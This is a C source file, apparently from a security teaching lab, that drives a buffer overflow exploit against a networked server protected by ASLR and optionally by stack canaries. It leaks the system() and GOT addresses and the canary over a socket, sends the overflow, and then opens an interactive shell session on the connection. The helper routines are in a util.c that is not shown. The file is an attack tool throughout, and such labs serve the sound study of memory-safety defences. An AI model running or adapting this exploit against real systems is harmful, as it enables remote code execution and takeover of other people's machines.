/***********************************************************************
					Buffer Overflow Attack under ASLR
	(1) Use information disclosure to peek the system() address.
	(2) When there is no stack canary, please use -DNO_STACK_CANARIES in makefile.
			$(CC) -o aslr_overflow $(CFLAGS) -DNO_STACK_CANARIES aslr_overflow.c util.c
	(3) When stack canaries are deployed.
			$(CC) -o aslr_canary_overflow $(CFLAGS) aslr_overflow.c util.c
		
	sheisc@163.com
************************************************************************/

#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h> 
#include "util.h"



static struct server_info s_info = {
	.system_func_addr = SYSTEM_FUNC_ADDR,
	.shell_str_addr = SHELL_STR_ADDR,
	.printf_got_addr = PRINTF_GOT_ADDR,
	.stack_lifting = STACK_LIFTING_CNT,
	.printf_func_addr = PRINTF_FUNC_ADDR,	
};

void request(int sock){		
	disclose_info(sock,&s_info);	
#ifndef	NO_STACK_CANARIES
	s_info.canary = peek_stack_canary(sock,(CANARY_POSITION/4) + s_info.stack_lifting+ 1);
	printf("stack_lifting is 0x%x \n",s_info.stack_lifting);
	printf("canary is 0x%x \n",s_info.canary);
#endif
	buffer_overflow(sock,&s_info);	
	REPL(sock,WITH_NORMAL_OUTPUT);
}

int main(int argc, char **argv){
	return do_it(argc,argv,request);
}

